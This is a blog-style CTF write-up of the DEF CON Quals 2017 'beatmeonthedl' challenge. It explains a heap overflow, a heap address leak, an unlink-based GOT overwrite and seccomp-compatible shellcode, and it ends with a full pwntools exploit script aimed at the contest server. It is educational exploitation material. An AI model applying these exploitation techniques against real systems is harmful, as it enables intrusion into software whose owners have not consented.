---
layout: post
title: "DEF CON Quals 2017: beatmeonthedl"
category: Security
date: 2017-04-30
tags:
  - ctf
  - DEF CON
  - writeup
---

I played in the DEF CON quals CTF this weekend, and happened to find the
challenge `beatmeonthedl` particularly interesting, even if it was in the
"Baby's First" category.  (DC Quals Baby's Firsts aren't as easy as one might
think...)

So we download the binary and take a look.  I'm using
[Binary Ninja](https://binary.ninja) lately, it's a great tool from the Vector35
guys, and at the right price compared to IDA for playing CTF.  :)  So I open up
the binary, and notice a few things right away.  This is an x86-64 ELF binary
with essentially none of the standard security features enabled:

~~~
% checksec beatmeonthedl
[+] 'beatmeonthedl'
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
~~~

Easy mode, right?

We'll, let's look at the binary and see if we can find a vulnerability.  Looking
at the binary, we can see it's a pretty typical CTF binary, we can create,
modify, delete, and print some notes.  This has been seen many times in various
forms.

At the beginning there's a little twist, it prompts you for a username
and password.  It's not hard to figure out what these should be, just take a
look at the functions `checkuser` and `checkpass`.  In `checkuser` you can see
that the username should be `mcfly`.  In `checkpass`, it's interesting that the
function copies the user input to an allocated buffer on the heap before
checking the password, and all it checks is that it beings with the string
`awesnap`.  The memory chunk is not freed before continuing, and in fact, if you
fail the login check, you will repeatedly get checks that allow you to continue
writing to segments on the heap.  The copies are correctly bounds-checked, so
there's no memory corruption here.  I'm not sure what the point of copying to
the heap is, as I didn't need it to solve the level.

Let's take a look at the `add_request` function that creates the new request
entries.  Looking through it, we see it allocates a chunk for the request entry
and then reads your request into the allocated chunk.  It took me a moment to
notice that there's something strange about the malloc and the respective read
of the request, but I've highlighted the relevant lines for your ease.

![malloc and read for new requests](/img/blog/dcq-2017/beatmeonthedl_addrequest.png)

Yep, it allocates `0x38` bytes and then reads `0x80` bytes into it.  Well, that
seems opportune, depending on what's past the chunk I'm reading into.  It
doesn't appear that his has any function pointers or vtable pointers (it appears
to be pure C), so nothing like that to overwrite.  Heap metadata corruption is a
thing of the past, right?  Well, if you notice that `malloc` is in blue and
other functions (`printf`, `read`) are in orange, you might realize something.
The malloc implementation being used by this binary is compiled into the
program.  A quick test does, in fact, show that this version of malloc does not
appear to use any validation checks on the heap metadata:

~~~
pwndbg> x/i $rip
=> 0x40656c <free+1096>:	mov    rax,QWORD PTR [rax+0x8]
pwndbg> i r rax
rax            0x41414141425e51a0	0x41414141425e51a0
~~~

So it seems like we can use the `unlink` technique described by [Solar
Designer](http://www.openwall.com/articles/JPEG-COM-Marker-Vulnerability) in
2000 to exploit heap metadata corruption via `free`.  If you're not familiar
with the technique, there's a more digestable version
[here](https://gbmaster.wordpress.com/2014/08/11/x86-exploitation-101-heap-overflows-unlink-me-would-you-please/).
This technique allows you to write one pointer-sized value at one address of
your choosing.  (Obviously, if you want to try to write more than one, you can
sometimes repeat the technique if the circumstances allow.)
Basically, you want to allocate two consecutive blocks, overflow the first into
the second in such a way that the 2nd meets some special properties, and then
free the first chunk, causing the malloc implementation to attempt to coalesce
the two free blocks into a bigger block and `unlink` the old "free" block.  Our
crafted block must:

- Have zero size
- Appear to be free (has the `IN_USE` bit cleared)
- Appear as part of a linked list where the first pointer goes to your target address
  minus one pointer width (e.g., target-8 on x86-64).
- Appear as part of a linked list where the second pointer is the value you want to
  write.

So if we know what we're going to do, we should be done, right?  Well, it's not
quite that simple -- we still need to know what we're going to write, and where
we're going to write it.

A common technique for this is to overwrite a pointer in the Global Offset Table
(GOT).  If you're not familiar with the GOT, I've previously written about
[using the GOT and PLT for
exploitation](/2017/03/19/got-and-plt-for-pwning.html).
Since there is no RELRO (Read-Only Relocations) on this binary, we can apply
this technique here in a straightforward fashion.  We can overwrite any function
that will be called after the `free` occurs.  For this binary, we can use any of
several functions, but both `puts` and `printf` are excellent choices since
they're called in fairly short order (by printing the menu the next time).

So *what* do we write?  Well, we want to point to some shellcode.  But where is
our shellcode?  Since there's not many places to put things on the stack and no
globals, I guess it'll have to be the heap.  We do have ASLR to contend with, so
we need a leak of a heap address.  It took me a while to realize how we could
get this, but then I hit upon it: by creating fragmentation within the heap, the
malloc implementation will have placed pointers for the circular linked list of
free blocks into the free blocks themselves.  Then overflowing an adjacent block
right up to the pointer, and printing the requests, we can get the value of the
pointer.  From that, we can round down to the start of the page and get the
beginning of the heap area.

Finally, we just need to place some shellcode in one of our blocks.  Note that
many (all?) of the DEF CON Quals challenges ran in a seccomp sandbox that
blocked the ability to use `execve`, so we'll have to use a `open/read/write`
shellcode.

Putting it all together (sorry, it's a bit sloppy, didn't have time to clean it
up yet):

~~~
import pwn
from pwnlib.shellcraft import amd64

pwn.context.binary = './beatmeonthedl'

PAD = 'A'*48 + 'B'*8
CHUNK_SIZE = pwn.p64(0)
TARGET_ADDR = 0x609970 # printf@got
TARGET_ADDR_CHUNK = pwn.p64(TARGET_ADDR-24)

proc = None
#proc = pwn.process('./beatmeonthedl')
proc = proc or pwn.remote(
        'beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me',
        6969)

def login():
    proc.recvuntil('username: ')
    proc.sendline('mcfly')
    proc.recvuntil('Pass: ')
    proc.sendline('awesnap')

def menu(n):
    proc.recvuntil('| ')
    proc.sendline(str(n))

pwn.log.info('Login')
login()

pwn.log.info('Create')
for _ in xrange(4):
    menu(1)
    proc.recv()
    proc.sendline('foo')

pwn.log.info('Leak')
menu(3)
proc.recv()
proc.sendline(str(2))
menu(3)
proc.recv()
proc.sendline(str(0))
# alter 1
menu(4)
proc.recv()
proc.sendline(str(1))
proc.recv()
proc.send('Q'*72)
menu(2)
res = proc.recvuntil('3)')
res = res[72+3:-3]
slot_0 = pwn.u64(res+('\0'*(8-len(res))))
print 'Slot 0 probably: {:#08x}'.format(slot_0)

pwn.log.info('Setup chunk')
# reallocate 0
menu(1)
proc.recv()
proc.send('AAAA')

# shellcode in 3
menu(4)
proc.recv()
proc.send(str(3))
proc.recv()
shellcode = '\xeb\x20' + ('\x90'*32)
shellcode += pwn.asm(amd64.cat('flag'))
proc.send(shellcode)

# edit 0 with overwrite
menu(4)
proc.recv()
proc.send(str(0))
proc.recv()
val = (PAD+CHUNK_SIZE+TARGET_ADDR_CHUNK)
target = slot_0+16 + 3*0x40  # target slot 3
print 'Target addr: {:#08x}'.format(target)
val += pwn.p64(target)
proc.send(val)

pwn.log.info('Overwrite')
# trigger free of previous chunk to cause coalescing
menu(3)
proc.recv()
proc.sendline(str(0))

proc.interactive()

pwn.log.info('Exit')
# exit
menu(5)
~~~
